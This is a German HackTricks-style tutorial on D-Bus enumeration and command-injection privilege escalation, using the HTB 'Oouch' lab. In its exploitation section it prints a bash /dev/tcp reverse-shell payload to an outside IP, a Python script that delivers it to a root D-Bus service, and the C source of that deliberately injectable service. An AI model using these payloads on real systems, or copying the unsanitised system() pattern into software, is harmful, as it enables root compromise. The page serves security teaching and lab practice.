# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI Enumeration**

D-Bus wird als Interprozesskommunikations (IPC) Vermittler in Ubuntu-Desktopumgebungen verwendet. Auf Ubuntu wird der gleichzeitige Betrieb mehrerer Nachrichtenbusse beobachtet: der Systembus, der hauptsächlich von **privilegierten Diensten genutzt wird, um systemrelevante Dienste bereitzustellen**, und ein Sitzungsbus für jeden angemeldeten Benutzer, der nur Dienste bereitstellt, die für diesen spezifischen Benutzer relevant sind. Der Fokus liegt hier hauptsächlich auf dem Systembus aufgrund seiner Verbindung zu Diensten, die mit höheren Rechten (z. B. root) ausgeführt werden, da unser Ziel darin besteht, die Privilegien zu erhöhen. Es wird angemerkt, dass die Architektur von D-Bus einen 'Router' pro Sitzungsbus verwendet, der dafür verantwortlich ist, Clientnachrichten an die entsprechenden Dienste weiterzuleiten, basierend auf der Adresse, die von den Clients für den Dienst angegeben wird, mit dem sie kommunizieren möchten.

Dienste auf D-Bus werden durch die **Objekte** und **Schnittstellen** definiert, die sie bereitstellen. Objekte können mit Klasseninstanzen in standardmäßigen OOP-Sprachen verglichen werden, wobei jede Instanz eindeutig durch einen **Objektpfad** identifiziert wird. Dieser Pfad, ähnlich einem Dateisystempfad, identifiziert jedes vom Dienst bereitgestellte Objekt eindeutig. Eine wichtige Schnittstelle für Forschungszwecke ist die **org.freedesktop.DBus.Introspectable** Schnittstelle, die eine einzelne Methode, Introspect, enthält. Diese Methode gibt eine XML-Darstellung der unterstützten Methoden, Signale und Eigenschaften des Objekts zurück, wobei hier der Fokus auf Methoden liegt, während Eigenschaften und Signale weggelassen werden.

Für die Kommunikation mit der D-Bus-Schnittstelle wurden zwei Werkzeuge eingesetzt: ein CLI-Tool namens **gdbus** für die einfache Aufrufung von Methoden, die von D-Bus in Skripten bereitgestellt werden, und [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ein auf Python basierendes GUI-Tool, das entwickelt wurde, um die auf jedem Bus verfügbaren Dienste zu enumerieren und die in jedem Dienst enthaltenen Objekte anzuzeigen.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Im ersten Bild sind die mit dem D-Bus-Systembus registrierten Dienste dargestellt, wobei **org.debin.apt** speziell hervorgehoben ist, nachdem die Schaltfläche Systembus ausgewählt wurde. D-Feet fragt diesen Dienst nach Objekten und zeigt Schnittstellen, Methoden, Eigenschaften und Signale für die gewählten Objekte an, wie im zweiten Bild zu sehen ist. Die Signatur jeder Methode wird ebenfalls detailliert dargestellt.

Ein bemerkenswertes Merkmal ist die Anzeige der **Prozess-ID (pid)** und der **Befehlszeile** des Dienstes, was nützlich ist, um zu bestätigen, ob der Dienst mit erhöhten Rechten ausgeführt wird, was für die Relevanz der Forschung wichtig ist.

**D-Feet ermöglicht auch die Methodenaufruf**: Benutzer können Python-Ausdrücke als Parameter eingeben, die D-Feet in D-Bus-Typen umwandelt, bevor sie an den Dienst übergeben werden.

Beachten Sie jedoch, dass **einige Methoden eine Authentifizierung erfordern**, bevor wir sie aufrufen können. Wir werden diese Methoden ignorieren, da unser Ziel darin besteht, unsere Berechtigungen ohne Anmeldeinformationen zu erhöhen.

Beachten Sie auch, dass einige der Dienste einen anderen D-Bus-Dienst namens org.freedeskto.PolicyKit1 abfragen, ob einem Benutzer erlaubt werden sollte, bestimmte Aktionen auszuführen oder nicht.

## **Cmd line Enumeration**

### Liste der Dienstobjekte

Es ist möglich, geöffnete D-Bus-Schnittstellen mit aufzulisten:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Verbindungen

[Von Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wenn ein Prozess eine Verbindung zu einem Bus herstellt, weist der Bus der Verbindung einen speziellen Busnamen zu, der als _einzigartiger Verbindungsname_ bezeichnet wird. Busnamen dieser Art sind unveränderlich – es ist garantiert, dass sie sich nicht ändern, solange die Verbindung besteht – und, was noch wichtiger ist, sie können während der Lebensdauer des Busses nicht wiederverwendet werden. Das bedeutet, dass keine andere Verbindung zu diesem Bus jemals einen solchen einzigartigen Verbindungsnamen zugewiesen bekommt, selbst wenn derselbe Prozess die Verbindung zum Bus schließt und eine neue erstellt. Einzigartige Verbindungsnamen sind leicht erkennbar, da sie mit dem – ansonsten verbotenen – Doppelpunktzeichen beginnen.

### Dienstobjektinformationen

Dann können Sie einige Informationen über die Schnittstelle mit:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

Sie müssen über ausreichende Berechtigungen verfügen.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect-Schnittstelle eines Dienstobjekts

Beachten Sie, dass in diesem Beispiel die neueste entdeckte Schnittstelle mit dem `tree`-Parameter ausgewählt wurde (_siehe vorherigen Abschnitt_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Beachten Sie die Methode `.Block` des Interfaces `htb.oouch.Block` (das ist das, was uns interessiert). Das "s" der anderen Spalten könnte bedeuten, dass ein String erwartet wird.

### Monitor/Capture Interface

Mit genügend Rechten (nur `send_destination` und `receive_sender` Rechte sind nicht genug) können Sie **eine D-Bus-Kommunikation überwachen**.

Um eine **Kommunikation** zu **überwachen**, müssen Sie **root** sein. Wenn Sie weiterhin Probleme haben, root zu sein, überprüfen Sie [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) und [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Wenn Sie wissen, wie man eine D-Bus-Konfigurationsdatei konfiguriert, um **nicht-root-Benutzern das Sniffen** der Kommunikation zu **erlauben**, kontaktieren Sie bitte **mich**!

Verschiedene Möglichkeiten zur Überwachung:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Im folgenden Beispiel wird die Schnittstelle `htb.oouch.Block` überwacht und **die Nachricht "**_**lalalalal**_**" wird durch Missverständnis gesendet**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Sie können `capture` anstelle von `monitor` verwenden, um die Ergebnisse in einer pcap-Datei zu speichern.

#### Alle Störungen filtern <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Wenn es einfach zu viele Informationen auf dem Bus gibt, übergeben Sie eine Übereinstimmungsregel wie folgt:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Mehrere Regeln können angegeben werden. Wenn eine Nachricht _irgendeiner_ der Regeln entspricht, wird die Nachricht ausgegeben. So:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Siehe die [D-Bus-Dokumentation](http://dbus.freedesktop.org/doc/dbus-specification.html) für weitere Informationen zur Syntax von Übereinstimmungsregeln.

### Mehr

`busctl` hat noch mehr Optionen, [**finden Sie alle hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Anfälliges Szenario**

Als Benutzer **qtc innerhalb des Hosts "oouch" von HTB** können Sie eine **unerwartete D-Bus-Konfigurationsdatei** im _/etc/dbus-1/system.d/htb.oouch.Block.conf_ finden:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Hinweis aus der vorherigen Konfiguration, dass **Sie der Benutzer `root` oder `www-data` sein müssen, um Informationen** über diese D-BUS-Kommunikation zu senden und zu empfangen.

Als Benutzer **qtc** im Docker-Container **aeb4525789d8** finden Sie einige dbus-bezogene Codes in der Datei _/code/oouch/routes.py._ Dies ist der interessante Code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Wie Sie sehen können, **stellt es eine Verbindung zu einer D-Bus-Schnittstelle her** und sendet an die **"Block"-Funktion** die "client_ip".

Auf der anderen Seite der D-Bus-Verbindung läuft ein C-kompiliertes Binary. Dieser Code **lauscht** in der D-Bus-Verbindung **nach IP-Adressen und ruft iptables über die `system`-Funktion auf**, um die angegebene IP-Adresse zu blockieren.\
**Der Aufruf von `system` ist absichtlich anfällig für Befehlsinjektion**, sodass eine Nutzlast wie die folgende eine Reverse-Shell erstellen wird: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Ausnutzen

Am Ende dieser Seite finden Sie den **kompletten C-Code der D-Bus-Anwendung**. Darin finden Sie zwischen den Zeilen 91-97 **wie der `D-Bus-Objektpfad`** **und der `Schnittstellenname`** **registriert** sind. Diese Informationen sind notwendig, um Informationen an die D-Bus-Verbindung zu senden:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Außerdem finden Sie in Zeile 57, dass **die einzige registrierte Methode** für diese D-Bus-Kommunikation `Block` heißt (_**Deshalb werden in dem folgenden Abschnitt die Payloads an das Dienstobjekt `htb.oouch.Block`, die Schnittstelle `/htb/oouch/Block` und den Methodennamen `Block` gesendet**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Der folgende Python-Code sendet die Nutzlast an die D-Bus-Verbindung zur `Block`-Methode über `block_iface.Block(runme)` (_beachten Sie, dass es aus dem vorherigen Codeabschnitt extrahiert wurde_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl und dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ist ein Tool, das verwendet wird, um Nachrichten an den „Message Bus“ zu senden.
- Message Bus – Eine Software, die von Systemen verwendet wird, um die Kommunikation zwischen Anwendungen zu erleichtern. Es steht im Zusammenhang mit Message Queue (Nachrichten sind in einer Reihenfolge angeordnet), aber im Message Bus werden die Nachrichten in einem Abonnementmodell gesendet und sind auch sehr schnell.
- Der „-system“-Tag wird verwendet, um zu erwähnen, dass es sich um eine Systemnachricht handelt, nicht um eine Sitzungsnachricht (standardmäßig).
- Der „–print-reply“-Tag wird verwendet, um unsere Nachricht angemessen auszudrucken und erhält alle Antworten in einem menschenlesbaren Format.
- „–dest=Dbus-Interface-Block“ Die Adresse der Dbus-Schnittstelle.
- „–string:“ – Art der Nachricht, die wir an die Schnittstelle senden möchten. Es gibt mehrere Formate zum Senden von Nachrichten wie double, bytes, booleans, int, objpath. Davon ist der „object path“ nützlich, wenn wir einen Pfad zu einer Datei an die Dbus-Schnittstelle senden möchten. In diesem Fall können wir eine spezielle Datei (FIFO) verwenden, um einen Befehl im Namen einer Datei an die Schnittstelle zu übergeben. „string:;“ – Dies dient dazu, den object path erneut aufzurufen, wo wir die FIFO-Reverse-Shell-Datei/-Befehl platzieren.

_Beachten Sie, dass in `htb.oouch.Block.Block` der erste Teil (`htb.oouch.Block`) auf das Dienstobjekt verweist und der letzte Teil (`.Block`) auf den Methodennamen._ 

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Referenzen

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
